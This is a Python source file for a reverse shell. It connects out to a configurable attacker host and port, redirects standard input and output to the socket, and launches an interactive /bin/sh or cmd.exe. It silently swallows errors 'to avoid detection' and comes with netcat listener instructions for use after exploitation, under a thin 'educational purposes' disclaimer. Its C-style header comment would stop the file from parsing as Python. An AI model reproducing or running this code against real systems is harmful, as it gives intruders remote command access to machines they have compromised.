/**
 * @file reverse-shell.py
 * @description A Python script for a basic reverse shell.
 *              This is for educational purposes ONLY. Do not use on systems without explicit authorization.
 *              A reverse shell allows an attacker to gain remote command-line access to a compromised machine.
 */

import socket
import subprocess
import os
import sys

# --- Configuration ---
# ATTACKER_HOST: The IP address or hostname of the attacker's machine (where the listener is running).
# ATTACKER_PORT: The port on the attacker's machine that the listener is listening on.
ATTACKER_HOST = "127.0.0.1"  # Change this to the attacker's IP address
ATTACKER_PORT = 4444         # Change this to the attacker's listening port

# --- Reverse Shell Logic ---
def reverse_shell(host, port):
    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the attacker's machine
        s.connect((host, port))
        
        # Redirect stdin, stdout, stderr to the socket
        os.dup2(s.fileno(), 0)  # stdin
        os.dup2(s.fileno(), 1)  # stdout
        os.dup2(s.fileno(), 2)  # stderr
        
        # Start a shell (e.g., /bin/sh on Linux, cmd.exe on Windows)
        # For Windows, use: subprocess.call(["cmd.exe"])
        # For Linux, use: subprocess.call(["/bin/sh", "-i"])
        # The -i flag makes the shell interactive.
        if sys.platform == "win32":
            subprocess.call(["cmd.exe"])
        else:
            subprocess.call(["/bin/sh", "-i"])
            
    except Exception as e:
        # print(f"Error during reverse shell: {e}") # This would print to stderr, which is redirected
        pass # Fail silently to avoid detection
    finally:
        if 's' in locals() and s:
            s.close()

# --- Main Execution ---
if __name__ == "__main__":
    print(f"[*] Attempting to establish reverse shell to {ATTACKER_HOST}:{ATTACKER_PORT}")
    print("    (This message will only appear if stdout is not yet redirected)")
    
    # In a real scenario, this script would be executed on the target machine
    # after successful exploitation (e.g., via command injection, file upload, etc.).
    
    # To test this locally:
    # 1. On your attacker machine, start a netcat listener:
    #    nc -lvnp 4444
    # 2. On the target machine (or locally, in another terminal), run this script:
    #    python3 reverse-shell.py
    # 3. You should see a shell open on your netcat listener.
    
    reverse_shell(ATTACKER_HOST, ATTACKER_PORT)

    print("[*] Reverse shell connection terminated or failed.")
